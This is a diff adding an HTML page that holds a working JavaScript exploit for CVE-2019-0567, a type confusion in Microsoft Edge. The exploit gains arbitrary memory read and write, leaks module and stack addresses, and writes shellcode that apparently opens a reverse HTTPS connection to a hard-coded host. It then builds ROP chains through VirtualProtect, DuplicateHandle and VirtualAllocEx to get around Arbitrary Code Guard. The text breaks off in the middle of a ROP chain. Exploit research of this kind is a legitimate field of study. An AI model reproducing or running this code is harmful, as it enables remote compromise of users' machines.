@@ -1,0 +1,1318 @@
+<button onclick="main()">Click me to exploit CVE-2019-0567!</button>
+
+<script>
+// CVE-2019-0567: Microsoft Edge Type Confusion
+// Author: Connor McGarr (@33y0re) Windows 10 1703 (OS build 15063.0)
+// Edited by Nattee Setobol for Windows 10 1703 (OS build 15063.483) 
+
+//Connor's version can be seen at https://github.com/connormcgarr/Exploit-Development/blob/master/Browser/CVE-2019-0567.html
+
+// Creating object obj
+// Properties are stored via auxSlots since properties weren't declared inline
+obj = {}
+obj.a = 1;
+obj.b = 2;
+obj.c = 3;
+obj.d = 4;
+obj.e = 5;
+obj.f = 6;
+obj.g = 7;
+obj.h = 8;
+obj.i = 9;
+obj.j = 10;
+
+// Create two DataView objects
+dataview1 = new DataView(new ArrayBuffer(0x100));
+dataview2 = new DataView(new ArrayBuffer(0x100));
+
+// Function to convert to hex for memory addresses
+function hex(x) {
+    return x.toString(16);
+}
+
+// Arbitrary read function
+function read64(lo, hi) {
+    dataview1.setUint32(0x38, lo, true);        // DataView+0x38 = dataview2->buffer
+    dataview1.setUint32(0x3C, hi, true);        // We set this to the memory address we want to read from (4 bytes at a time: e.g. 0x38 and 0x3C)
+
+    // Instead of returning a 64-bit value here, we will create a 32-bit typed array and return the entire away
+    // Write primitive requires breaking the 64-bit address up into 2 32-bit values so this allows us an easy way to do this
+    var arrayRead = new Uint32Array(0x10);
+    arrayRead[0] = dataview2.getInt32(0x0, true);   // 4-byte arbitrary read
+    arrayRead[1] = dataview2.getInt32(0x4, true);   // 4-byte arbitrary read
+
+    // Return the array
+    return arrayRead;
+}
+
+// Arbitrary write function
+function write64(lo, hi, valLo, valHi) {
+    dataview1.setUint32(0x38, lo, true);        // DataView+0x38 = dataview2->buffer
+    dataview1.setUint32(0x3C, hi, true);        // We set this to the memory address we want to write to (4 bytes at a time: e.g. 0x38 and 0x3C)
+
+    // Perform the write with our 64-bit value (broken into two 4 bytes values, because of JavaScript)
+    dataview2.setUint32(0x0, valLo, true);       // 4-byte arbitrary write
+    dataview2.setUint32(0x4, valHi, true);       // 4-byte arbitrary write
+}
+
+// Function used to set prototype on tmp function to cause type transition on o object
+function opt(o, proto, value) {
+    o.b = 1;
+
+    let tmp = {__proto__: proto};
+
+    o.a = value;
+}
+
+// main function
+function main() {
+    for (let i = 0; i < 2000; i++) {
+        let o = {a: 1, b: 2};
+        opt(o, {}, {});
+    }
+
+    let o = {a: 1, b: 2};
+
+    opt(o, o, obj);     // Instead of supplying 0x1234, we are supplying our obj
+
+    // Corrupt obj->auxSlots with the address of the first DataView object
+    o.c = dataview1;
+
+    // Corrupt dataview1->buffer with the address of the second DataView object
+    obj.h = dataview2;
+
+    // dataview1 methods act on dataview2 object
+    // Since vftable is located from 0x0 - 0x8 in dataview2, we can simply just retrieve it without going through our read64() function
+    vtableLo = dataview1.getUint32(0x0, true);
+    vtableHigh = dataview1.getUint32(0x4, true);
+
+    // Extract dataview2->type (located 0x8 - 0x10) so we can follow the chain of pointers to leak a stack address via...
+    // ... type->javascriptLibrary->scriptContext->threadContext
+    typeLo = dataview1.getUint32(0x8, true);
+    typeHigh = dataview1.getUint32(0xC, true);
+
+    // Print update
+    document.write("[+] DataView object 2 leaked vtable from chakra.dll: 0x" + hex(vtableHigh) + hex(vtableLo));
+    document.write("<br>");
+
+    // Store the base of chakra.dll
+    chakraLo = vtableLo - 0x005cfc18;
+    chakraHigh = vtableHigh;
+
+    // Print update
+    document.write("[+] chakra.dll base address: 0x" + hex(chakraHigh) + hex(chakraLo));
+    document.write("<br>");
+
+    // Leak a pointer to kernelbase.dll (KERNELBASE!DuplicateHandle) from the IAT of chakra.dll
+    // chakra+0x5ee2b8 points to KERNELBASE!DuplicateHandle
+    kernelbaseLeak = read64(chakraLo+0x005ed2e8, chakraHigh);
+
+    // KERNELBASE!DuplicateHandle is 0x18de0 away from kernelbase.dll's base address
+    kernelbaseLo = kernelbaseLeak[0]-0x18de0;
+    kernelbaseHigh = kernelbaseLeak[1];
+
+    // Store the pointer to KERNELBASE!DuplicateHandle (needed for our ACG bypass) into a more aptly named variable
+    var duplicateHandle = new Uint32Array(0x4);
+    duplicateHandle[0] = kernelbaseLeak[0];
+    duplicateHandle[1] = kernelbaseLeak[1];
+
+    // Print update
+    document.write("[+] kernelbase.dll base address: 0x" + hex(kernelbaseHigh) + hex(kernelbaseLo));
+    document.write("<br>");
+
+    // ---------------------------------------------------------------------------------------------
+
+    // Print update with our type pointer
+    document.write("[+] type pointer: 0x" + hex(typeHigh) + hex(typeLo));
+    document.write("<br>");
+
+    // Arbitrary read to get the javascriptLibrary pointer (offset of 0x8 from type)
+    javascriptLibrary = read64(typeLo+8, typeHigh);
+
+    // Arbitrary read to get the scriptContext pointer (offset 0x450 from javascriptLibrary. Found this manually)
+    scriptContext = read64(javascriptLibrary[0]+0x430, javascriptLibrary[1])
+
+    // Arbitrary read to get the threadContext pointer (offset 0x3b8)
+    threadContext = read64(scriptContext[0]+0x5c0, scriptContext[1]);
+
+    // Leak a pointer to a pointer on the stack from threadContext at offset 0x8f0
+    // https://bugs.chromium.org/p/project-zero/issues/detail?id=1360
+    // Offsets are slightly different (0x8f0 and 0x8f8 to leak stack addresses)
+    stackleakPointer = read64(threadContext[0]+0x8f8, threadContext[1]);
+
+    // Print update
+    document.write("[+] Leaked stack address! type->javascriptLibrary->scriptContext->threadContext->leafInterpreterFrame: 0x" + hex(stackleakPointer[1]) + hex(stackleakPointer[0]));
+    document.write("<br>");
+    
+    // Counter
+    let countMe = 0;
+
+    // Helper function for counting
+    function inc()
+    {
+        countMe+=0x8;
+    }
+
+    write64(chakraLo+0x74b000+countMe, chakraHigh, 0xe48348fc, 0x00cce8f0);
+    inc();
+    write64(chakraLo+0x74b000+countMe, chakraHigh, 0x51410000, 0x51525041);
+    inc();
+    write64(chakraLo+0x74b000+countMe, chakraHigh, 0xd2314856, 0x528b4865);
+    inc();
+    write64(chakraLo+0x74b000+countMe, chakraHigh, 0x528b4860, 0x528b4818);
+    inc();
+    write64(chakraLo+0x74b000+countMe, chakraHigh, 0xb70f4820, 0x314d4a4a);
+    inc();
+    write64(chakraLo+0x74b000+countMe, chakraHigh, 0x728b48c9, 0xc0314850);
+    inc();
+    write64(chakraLo+0x74b000+countMe, chakraHigh, 0x7c613cac, 0x41202c02);
+    inc();
+    write64(chakraLo+0x74b000+countMe, chakraHigh, 0x410dc9c1, 0xede2c101);
+    inc();
+    write64(chakraLo+0x74b000+countMe, chakraHigh, 0x528b4852, 0x3c428b20);
+    inc();
+    write64(chakraLo+0x74b000+countMe, chakraHigh, 0x41d00148, 0x78816651);
+    inc();
+    write64(chakraLo+0x74b000+countMe, chakraHigh, 0x0f020b18, 0x00007285);
+    inc();
+    write64(chakraLo+0x74b000+countMe, chakraHigh, 0x88808b00, 0x48000000);
+    inc();
+    write64(chakraLo+0x74b000+countMe, chakraHigh, 0x6774c085, 0x8bd00148);
+    inc();
+    write64(chakraLo+0x74b000+countMe, chakraHigh, 0x8b441848, 0x01492040);
+    inc();
+    write64(chakraLo+0x74b000+countMe, chakraHigh, 0x56e350d0, 0x48c9314d);
+    inc();
+    write64(chakraLo+0x74b000+countMe, chakraHigh, 0x8b41c9ff, 0x01488834);
+    inc();
+    write64(chakraLo+0x74b000+countMe, chakraHigh, 0xc03148d6, 0x0dc9c141);
+    inc();
+    write64(chakraLo+0x74b000+countMe, chakraHigh, 0xc10141ac, 0xf175e038);
+    inc();
+    write64(chakraLo+0x74b000+countMe, chakraHigh, 0x244c034c, 0xd1394508);
+    inc();
+    write64(chakraLo+0x74b000+countMe, chakraHigh, 0x4458d875, 0x4924408b);
+    inc();
+    write64(chakraLo+0x74b000+countMe, chakraHigh, 0x4166d001, 0x44480c8b);
+    inc();
+    write64(chakraLo+0x74b000+countMe, chakraHigh, 0x491c408b, 0x8b41d001);
+    inc();
+    write64(chakraLo+0x74b000+countMe, chakraHigh, 0x58418804, 0x01485841);
+    inc();
+    write64(chakraLo+0x74b000+countMe, chakraHigh, 0x5a595ed0, 0x59415841);
+    inc();
+    write64(chakraLo+0x74b000+countMe, chakraHigh, 0x83485a41, 0x524120ec);
+    inc();
+    write64(chakraLo+0x74b000+countMe, chakraHigh, 0x4158e0ff, 0x8b485a59);
+    inc();
+    write64(chakraLo+0x74b000+countMe, chakraHigh, 0xff4be912, 0x485dffff);
+    inc();
+    write64(chakraLo+0x74b000+countMe, chakraHigh, 0x4953db31, 0x6e6977be);
+    inc();
+    write64(chakraLo+0x74b000+countMe, chakraHigh, 0x74656e69, 0x48564100);
+    inc();
+    write64(chakraLo+0x74b000+countMe, chakraHigh, 0xc749e189, 0x26774cc2);
+    inc();
+    write64(chakraLo+0x74b000+countMe, chakraHigh, 0x53d5ff07, 0xe1894853);
+    inc();
+    write64(chakraLo+0x74b000+countMe, chakraHigh, 0x314d5a53, 0xc9314dc0);
+    inc();
+    write64(chakraLo+0x74b000+countMe, chakraHigh, 0xba495353, 0xa779563a);
+    inc();
+    write64(chakraLo+0x74b000+countMe, chakraHigh, 0x00000000, 0x0be8d5ff);
+    inc();
+    write64(chakraLo+0x74b000+countMe, chakraHigh, 0x31000000, 0x2e302e30);
+    inc();
+    write64(chakraLo+0x74b000+countMe, chakraHigh, 0x35312e30, 0x485a0034);
+    inc();
+    write64(chakraLo+0x74b000+countMe, chakraHigh, 0xc749c189, 0x0001bbc0);
+    inc();
+    write64(chakraLo+0x74b000+countMe, chakraHigh, 0xc9314d00, 0x036a5353);
+    inc();
+    write64(chakraLo+0x74b000+countMe, chakraHigh, 0x57ba4953, 0x00c69f89);
+    inc();
+    write64(chakraLo+0x74b000+countMe, chakraHigh, 0xff000000, 0x00d6e8d5);
+    inc();
+    write64(chakraLo+0x74b000+countMe, chakraHigh, 0x712f0000, 0x66304d45);
+    inc();
+    write64(chakraLo+0x74b000+countMe, chakraHigh, 0x4f48626d, 0x66537761);
+    inc();
+    write64(chakraLo+0x74b000+countMe, chakraHigh, 0x64394e78, 0x3046744f);
+    inc();
+    write64(chakraLo+0x74b000+countMe, chakraHigh, 0x664a5541, 0x36337a45);
+    inc();
+    write64(chakraLo+0x74b000+countMe, chakraHigh, 0x654b6f73, 0x56507439);
+    inc();
+    write64(chakraLo+0x74b000+countMe, chakraHigh, 0x34654968, 0x4d703272);
+    inc();
+    write64(chakraLo+0x74b000+countMe, chakraHigh, 0x65696459, 0x4c36786a);
+    inc();
+    write64(chakraLo+0x74b000+countMe, chakraHigh, 0x6450416d, 0x4b506950);
+    inc();
+    write64(chakraLo+0x74b000+countMe, chakraHigh, 0x43316265, 0x7957444e);
+    inc();
+    write64(chakraLo+0x74b000+countMe, chakraHigh, 0x51717230, 0x7148556c);
+    inc();
+    write64(chakraLo+0x74b000+countMe, chakraHigh, 0x4768344f, 0x62645950);
+    inc();
+    write64(chakraLo+0x74b000+countMe, chakraHigh, 0x5a476461, 0x5a79416b);
+    inc();
+    write64(chakraLo+0x74b000+countMe, chakraHigh, 0x31626f6a, 0x62335a35);
+    inc();
+    write64(chakraLo+0x74b000+countMe, chakraHigh, 0x38754b46, 0x6c795a41);
+    inc();
+    write64(chakraLo+0x74b000+countMe, chakraHigh, 0x6c666a73, 0x5f6c4246);
+    inc();
+    write64(chakraLo+0x74b000+countMe, chakraHigh, 0x68543667, 0x616b7755);
+    inc();
+    write64(chakraLo+0x74b000+countMe, chakraHigh, 0x4f637061, 0x6a6f5570);
+    inc();
+    write64(chakraLo+0x74b000+countMe, chakraHigh, 0x43716167, 0x5f65644b);
+    inc();
+    write64(chakraLo+0x74b000+countMe, chakraHigh, 0x4251394a, 0x7150395a);
+    inc();
+    write64(chakraLo+0x74b000+countMe, chakraHigh, 0x48765662, 0x5a637855);
+    inc();
+    write64(chakraLo+0x74b000+countMe, chakraHigh, 0x464d4a48, 0x34557339);
+    inc();
+    write64(chakraLo+0x74b000+countMe, chakraHigh, 0x77347476, 0x51463357);
+    inc();
+    write64(chakraLo+0x74b000+countMe, chakraHigh, 0x484f3365, 0x38465331);
+    inc();
+    write64(chakraLo+0x74b000+countMe, chakraHigh, 0x516f5874, 0x6a417433);
+    inc();
+    write64(chakraLo+0x74b000+countMe, chakraHigh, 0x43643835, 0x517a785a);
+    inc();
+    write64(chakraLo+0x74b000+countMe, chakraHigh, 0x47592d52, 0x596b5457);
+    inc();
+    write64(chakraLo+0x74b000+countMe, chakraHigh, 0x50655752, 0x005a4a71);
+    inc();
+    write64(chakraLo+0x74b000+countMe, chakraHigh, 0x53c18948, 0x4d58415a);
+    inc();
+    write64(chakraLo+0x74b000+countMe, chakraHigh, 0x4853c931, 0x280200b8);
+    inc();
+    write64(chakraLo+0x74b000+countMe, chakraHigh, 0x00000084, 0x53535000);
+    inc();
+    write64(chakraLo+0x74b000+countMe, chakraHigh, 0xebc2c749, 0xff3b2e55);
+    inc();
+    write64(chakraLo+0x74b000+countMe, chakraHigh, 0xc68948d5, 0x535f0a6a);
+    inc();
+    write64(chakraLo+0x74b000+countMe, chakraHigh, 0xf189485a, 0x4dc9314d);
+    inc();
+    write64(chakraLo+0x74b000+countMe, chakraHigh, 0x5353c931, 0x2dc2c749);
+    inc();
+    write64(chakraLo+0x74b000+countMe, chakraHigh, 0xff7b1806, 0x75c085d5);
+    inc();
+    write64(chakraLo+0x74b000+countMe, chakraHigh, 0xc1c7481f, 0x00001388);
+    inc();
+    write64(chakraLo+0x74b000+countMe, chakraHigh, 0xf044ba49, 0x0000e035);
+    inc();
+    write64(chakraLo+0x74b000+countMe, chakraHigh, 0xd5ff0000, 0x74cfff48);
+    inc();
+    write64(chakraLo+0x74b000+countMe, chakraHigh, 0xe8cceb02, 0x00000055);
+    inc();
+    write64(chakraLo+0x74b000+countMe, chakraHigh, 0x406a5953, 0xd189495a);
+    inc();
+    write64(chakraLo+0x74b000+countMe, chakraHigh, 0x4910e2c1, 0x1000c0c7);
+    inc();
+    write64(chakraLo+0x74b000+countMe, chakraHigh, 0xba490000, 0xe553a458);
+    inc();
+    write64(chakraLo+0x74b000+countMe, chakraHigh, 0x00000000, 0x9348d5ff);
+    inc();
+    write64(chakraLo+0x74b000+countMe, chakraHigh, 0x89485353, 0xf18948e7);
+    inc();
+    write64(chakraLo+0x74b000+countMe, chakraHigh, 0x49da8948, 0x2000c0c7);
+    inc();
+    write64(chakraLo+0x74b000+countMe, chakraHigh, 0x89490000, 0x12ba49f9);
+    inc();
+    write64(chakraLo+0x74b000+countMe, chakraHigh, 0x00e28996, 0xff000000);
+    inc();
+    write64(chakraLo+0x74b000+countMe, chakraHigh, 0xc48348d5, 0x74c08520);
+    inc();
+    write64(chakraLo+0x74b000+countMe, chakraHigh, 0x078b66b2, 0x85c30148);
+    inc();
+    write64(chakraLo+0x74b000+countMe, chakraHigh, 0x58d275c0, 0x006a58c3);
+    inc();
+    write64(chakraLo+0x74b000+countMe, chakraHigh, 0xc2c74959, 0x56a2b5f0);
+    inc();
+    write64(chakraLo+0x74b000+countMe, chakraHigh, 0x0000000,0x0000d5ff );
+    inc();
+
+
+
+    ropBegin = countMe;
+
+ //   countMe +=0x50;
+
+    //countMe +=0x8;
+
+    write64(chakraLo+0x74b000+countMe, chakraHigh, chakraLo+0x41ec2a, chakraHigh);         // 0x1800d43db: pop rax ; ret
+    inc();
+    write64(chakraLo+0x74b000+countMe, chakraHigh, chakraLo+0x41ec2a, chakraHigh);         // .data pointer from chakra.dll with a non-zero value to bypass cmp r8d, [rax] future gadget
+    inc();
+    write64(chakraLo+0x74b000+countMe, chakraHigh, chakraLo+0x76b7, chakraHigh);         // 0x1802da1fb pop rcx; ret
+    inc();
+    write64(chakraLo+0x74b000+countMe, chakraHigh, chakraLo+0x74b030, chakraHigh);         // PDWORD lpflOldProtect (any writable address -> Eventually placed in R9)
+    inc();
+    write64(chakraLo+0x74b000+countMe, chakraHigh, chakraLo+0x18cb14, chakraHigh);         // DWORD 0x000000018018cb14: mov r9, rcx; cmp r8d, dword ptr [rax]; je 0x18cb24; mov al, r10b; add rsp, 0x28; ret; 0x000000018018cb14
+    inc();
+    write64(chakraLo+0x74b000+countMe, chakraHigh, 0x41414141, 0x41414141);                // Padding for add rsp, 0x28
+    inc();
+    write64(chakraLo+0x74b000+countMe, chakraHigh, 0x41414141, 0x41414141);                // Padding for add rsp, 0x28
+    inc();
+    write64(chakraLo+0x74b000+countMe, chakraHigh, 0x41414141, 0x41414141);                // Padding for add rsp, 0x28
+    inc();
+    write64(chakraLo+0x74b000+countMe, chakraHigh, 0x41414141, 0x41414141);                // Padding for add rsp, 0x28
+    inc();
+    write64(chakraLo+0x74b000+countMe, chakraHigh, 0x41414141, 0x41414141);                // Padding for add rsp, 0x28
+    inc();
+    write64(chakraLo+0x74b000+countMe, chakraHigh, chakraLo+0x76b7, chakraHigh);         // 0x1802da1fb pop rcx; ret
+    inc();
+
+    ropoffsetOne = countMe;
+
+    write64(chakraLo+0x74b000+countMe, chakraHigh, 0x00000000, 0x00000000);                // LPVOID lpAddress (Eventually will be updated to the address we want to mark as RWX, our shellcode)
+    inc();
+    write64(chakraLo+0x74b000+countMe, chakraHigh, chakraLo+0x3c7b5, chakraHigh);          // 0x18003c7b5: pop rdx ; ret
+    inc();
+    write64(chakraLo+0x74b000+countMe, chakraHigh, 0x00001000, 0x00000000);                // SIZE_T dwSize (0x1000)
+    inc();
+    write64(chakraLo+0x74b000+countMe, chakraHigh, chakraLo+0x37193d, chakraHigh);         // 0x000000018037193d: pop r8; setne al; ret;
+    inc();
+    write64(chakraLo+0x74b000+countMe, chakraHigh, 0x00000040, 0x00000000);                // DWORD flNewProtect (PAGE_EXECUTE_READWRITE)
+    inc();
+    write64(chakraLo+0x74b000+countMe, chakraHigh, chakraLo+0x41ec2a, chakraHigh);         // 0x1800d43db: pop rax ; ret
+    inc();
+    write64(chakraLo+0x74b000+countMe, chakraHigh, kernelbaseLo+0x61700, kernelbaseHigh);  // KERNELBASE!VirtualProtect
+    inc();
+    write64(chakraLo+0x74b000+countMe, chakraHigh, chakraLo+0x1266cd, chakraHigh);         // 0x1801266cd: jmp rax
+    inc();
+    write64(chakraLo+0x74b000+countMe, chakraHigh, chakraLo+0x585174, chakraHigh);          // 0x18000c98d: add rsp, 0x18 ; ret
+    inc();
+    write64(chakraLo+0x74b000+countMe, chakraHigh, 0x41414141, 0x41414141);                // Padding
+    inc();
+    write64(chakraLo+0x74b000+countMe, chakraHigh, 0x41414141, 0x41414141);                // Padding
+    inc();
+    write64(chakraLo+0x74b000+countMe, chakraHigh, 0x41414141, 0x41414141);                // Padding
+    inc();
+    write64(chakraLo+0x74b000+countMe, chakraHigh, chakraLo+0x5892cf, chakraHigh);         // 0x1804c1b65: pop rdi ; ret
+    inc();
+
+    // Store the current offset within the .data section into a var
+    ropoffsetTwo = countMe;
+
+    write64(chakraLo+0x74b000+countMe, chakraHigh, 0x00000000, 0x00000000);                // Will be updated with the VirtualAllocEx allocation (our shellcode)
+    inc();
+    write64(chakraLo+0x74b000+countMe, chakraHigh, chakraLo+0x558261, chakraHigh);         // 0x1801ef039: push rdi ; ret (Return into our shellcode)
+    inc();
+
+    // Spawn an alert dialogue to pause execution
+    //00276e53
+    // We can reliably traverse the stack 0x6000 bytes
+    // Scan the stack for the return address below
+    /*
+    0:020> u chakra+0xd4a73
+    chakra!Js::JavascriptFunction::CallFunction<1>+0x83:
+    00007fff`3a454a73 488b5c2478      mov     rbx,qword ptr [rsp+78h]
+    00007fff`3a454a78 4883c440        add     rsp,40h
+    00007fff`3a454a7c 5f              pop     rdi
+    00007fff`3a454a7d 5e              pop     rsi
+    00007fff`3a454a7e 5d              pop     rbp
+    00007fff`3a454a7f c3              ret
+    */
+
+    // Creating an array to store the return address because read64() returns an array of 2 32-bit values
+    var returnAddress = new Uint32Array(0x4);
+    returnAddress[0] = chakraLo + 0x000d3b53;
+    returnAddress[1] = chakraHigh;
+
+	// Counter variable
+	let counter = 0x6000;
+
+	// Loop
+	while (counter != 0)
+	{
+	    // Store the contents of the stack
+	    tempContents = read64(stackleakPointer[0]+counter, stackleakPointer[1]);
+
+	    // Did we find our target return address?
+        if ((tempContents[0] == returnAddress[0]) && (tempContents[1] == returnAddress[1]))
+        {
+			document.write("[+] Found our return address on the stack!");
+            document.write("<br>");
+            document.write("[+] Target stack address: 0x" + hex(stackleakPointer[1]) + hex(stackleakPointer[0]+counter));
+            document.write("<br>");
+
+            // Break the loop
+            break;
+
+        }
+        else
+        {
+        	// Decrement the counter
+	    	// This is because the leaked stack address is near the stack base so we need to traverse backwards towards the stack limit
+	    	counter -= 0x8;
+        }
+	}
+
+    // alert() for debugging
+    alert("DEBUG");
+
+    jitHandle = read64(chakraLo+0x74b838, chakraHigh);
+ 
+    function next()
+    {
+        counter+=0x8;
+    }
+
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x3c7b5, chakraHigh);       // 0x18003c7b5: pop rdx ; ret ;
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0xffffffff, 0xffffffff);             // Psuedo-handle to current process
+    next();
+
+    // HANDLE hTargetProcessHandle (R8)
+    // (HANDLE)-1 value of current process
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x24626b, chakraHigh);      // 0x18024626b: mov r8, rdx ; add rsp, 0x48 ; ret ; 
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
+    next();
+
+    // LPHANDLE lpTargetHandle (R9)
+    // This needs to be a writable address where the full JIT handle will be stored
+    // Using .data section of chakra.dll in a part where there is no data
+    /*
+    0:053> dqs chakra+0x72E000+0x20010
+    00007ffc`052ae010  00000000`00000000
+    00007ffc`052ae018  00000000`00000000
+    */
+
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x41ec2a, chakraHigh);      // 0x18041ec2a: pop rax ; ret ;
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x74b000, chakraHigh);      // .data pointer from chakra.dll with a non-zero value to bypass cmp r8d, [rax] future gadget
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x76b7, chakraHigh);       // 0x1800076b7: pop rcx ; ret
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x74e030, chakraHigh);      // .data pointer from chakra.dll which will hold full perms handle to JIT server;
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x18cb14, chakraHigh);       // DWORD 0x000000018018cb14:mov r9, rcx ; cmp r8d,  [rax] ; je 0x00000001800F6280 ; mov al, r10L ; add rsp, 0x28 ; ret
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
+    next();
+    // HANDLE hSourceProcessHandle (RCX)
+    // Handle to the JIT process from the content process
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x76b7, chakraHigh);       // 0x1800076b7 pop rcx; ret
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], jitHandle[0], jitHandle[1]);         // PROCESS_DUP_HANDLE HANDLE to JIT server
+    next();
+
+    // Call KERNELBASE!DuplicateHandle
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x41ec2a, chakraHigh);      // 0x18041ec2a: pop rax ; ret
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], duplicateHandle[0], duplicateHandle[1]); // KERNELBASE!DuplicateHandle (Recall this was our original leaked pointer var for kernelbase.dll)
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x1266cd, chakraHigh);      // 0x180272beb: jmp rax (Call KERNELBASE!DuplicateHandle)
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x58cdd0, chakraHigh);      //  "return address" for KERNELBASE!DuplicateHandle - 0x18058cdd0: add rsp, 0x38 ; ret
+    next(); 
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000000, 0x00000000);             // DWORD dwDesiredAccess (RSP+0x28)
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000000, 0x00000000);             // BOOL bInheritHandle (RSP+0x30)
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000002, 0x00000000);             // DWORD dwOptions (RSP+0x38)
+    next();
+
+    //VIRTUAL ALLOC ROP STARTS HERE
+    // VirtuaAllocEx() ROP chain
+    // Stage 2 -> Allocate memory in the Edge JIT process (we have a full handle there now)
+
+    // DWORD flAllocationType (R9)
+    // MEM_RESERVE (0x00002000) | MEM_COMMIT (0x00001000)
+    /*
+    0:031> ? 0x00002000 | 0x00001000 
+    Evaluate expression: 12288 = 00000000`00003000
+    */
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x41ec2a, chakraHigh);      // 0x18041ec2a: pop rax ; ret ;
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x74e010, chakraHigh);      // .data pointer from chakra.dll (ensures future cmp r8d, [rax] gadget writes to a valid pointer)
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x76b7, chakraHigh);       // 0x1800076b7 pop rcx; ret
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00003000, 0x00000000);             // MEM_RESERVE | MEM_COMMIT
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x18cb14, chakraHigh);      //DWORD 0x000000018018cb14:mov r9, rcx ; cmp r8d,  [rax] ; je 0x00000001800F6280 ; mov al, r10L ; add rsp, 0x28 ; ret 
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
+    next();
+
+    // SIZE_T dwSize (R8)
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x3c7b5, chakraHigh);       // 0x18003c7b5: pop rdx ; ret ;
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00001000, 0x00000000);             // 0x1000 (shellcode size)
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x24626b, chakraHigh);      // 0x18024626b: mov r8, rdx ; add rsp, 0x48 ; ret ;    
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
+    next();
+    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
+    next();
